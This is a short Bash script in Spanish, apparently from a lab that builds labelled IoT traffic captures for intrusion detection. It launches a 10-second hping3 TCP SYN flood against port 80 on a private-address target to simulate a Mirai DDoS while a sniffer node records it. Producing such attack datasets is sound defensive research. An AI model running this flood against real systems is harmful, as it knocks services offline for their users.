#!/usr/bin/env bash
# ==============================================================================
# NODO: IoT-Cam-1 (192.168.10.10)
# FASE 6.3 - ESCENARIO 3: Ataque DDoS Mirai - TCP SYN Flood (label = 1)
# Propósito: Ráfaga controlada TCP SYN Flood al puerto 80 durante 10 segundos
# Uso: sudo bash scripts/iot-cam-1/05_escenario3_mirai_syn.sh [ip_victima=172.16.0.100]
# ==============================================================================
set -euo pipefail

TARGET="${1:-172.16.0.100}"
DURATION="${2:-10s}"

echo "=================================================================="
echo "[IoT-Cam-1] ESCENARIO 3: Ataque DDoS Mirai - TCP SYN Flood (label = 1)"
echo "Objetivo: $TARGET:80 | Duración: $DURATION | Intervalo: u1000 (1000 pkt/s)"
echo "=================================================================="
echo "[!] Asegúrate de haber iniciado la captura en SOC-Sniffer:"
echo "    sudo bash scripts/soc-sniffer/03_capturar_escenario.sh mirai_syn"
echo "------------------------------------------------------------------"

timeout "$DURATION" hping3 -S -p 80 -i u1000 "$TARGET" || true

echo ""
echo "=================================================================="
echo "[OK] Escenario 3 (Mirai SYN Flood) finalizado."
echo " -> Presiona Ctrl + C en SOC-Sniffer para guardar 'mirai_syn.pcap'."
echo "=================================================================="
